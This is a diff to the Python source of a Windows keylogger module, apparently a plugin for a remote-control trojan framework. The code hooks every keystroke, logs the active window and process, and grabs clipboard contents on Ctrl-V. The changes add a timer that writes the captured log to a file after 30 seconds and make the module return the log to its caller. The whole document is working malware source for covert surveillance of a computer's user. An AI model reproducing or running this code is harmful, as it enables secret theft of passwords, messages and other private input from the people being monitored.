@@ -1,7 +1,10 @@
 from ctypes import *
+from threading import Timer
 import pythoncom
 import pyHook 
 import win32clipboard
+import win32api
+import win32con
 import getpass
 import time
 
@@ -9,16 +12,27 @@ user32   = windll.user32
 kernel32 = windll.kernel32
 psapi    = windll.psapi
 current_window = None
+main_thread_id = win32api.GetCurrentThreadId()
 
 user_info = getpass.getuser()
 
 logger = ""
 
 def run(**args):
-	print "[*] In keylogger mod"
-	
-	#start keylogger for a time period
-	startLog()
+        print "[*] In keylogger mod"
+
+        #start keylogger for a time period
+        startLog()
+
+        print "Helloooo"
+        return logger
+
+def on_timer():
+        logfile = open("output.txt", 'w')
+        logfile.write(logger)
+        logfile.close()
+        win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);
+    
 
 def get_current_process():
         global logger
@@ -59,32 +73,32 @@ def get_current_process():
     
 def KeyStroke(event):
 
-    global current_window, logger   
+        global current_window, logger   
 
-    # check to see if target changed windows
-    if event.WindowName != current_window:
-        current_window = event.WindowName        
-        get_current_process()
+        # check to see if target changed windows
+        if event.WindowName != current_window:
+                current_window = event.WindowName        
+                get_current_process()
 
-    # if they pressed a standard key
-    if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
-        logger += chr(event.Ascii)
-    else:
+        # if they pressed a standard key
+        if event.Ascii > 32 and event.Ascii < 127:
+                print chr(event.Ascii),
+                logger += chr(event.Ascii)
+        else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
-        if event.Key == "V":
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            print "[PASTE] - %s" % (pasted_value),
-            logger += "[PASTE] - %s" % (pasted_value)
-        else:
-            print "[%s]" % event.Key,
-            logger += "[%s]" % event.Key
+                if event.Key == "V":
+                    win32clipboard.OpenClipboard()
+                    pasted_value = win32clipboard.GetClipboardData()
+                    win32clipboard.CloseClipboard()
+                    print "[PASTE] - %s" % (pasted_value),
+                    logger += "[PASTE] - %s" % (pasted_value)
+                else:
+                    print "[%s]" % event.Key,
+                    logger += "[%s]" % event.Key
 
-    # pass execution to next hook registered 
-    return True
+        # pass execution to next hook registered 
+        return True
 
 def startLog():
         global logger
@@ -97,6 +111,8 @@ def startLog():
         logger += str((time.strftime("%d/%m/%Y - %H:%M:%S")))
         logger += "\n"
 
+        t = Timer(30.0, on_timer) # Quit after 5 seconds
+        t.start()
 
         # create and register a hook manager 
         kl         = pyHook.HookManager()
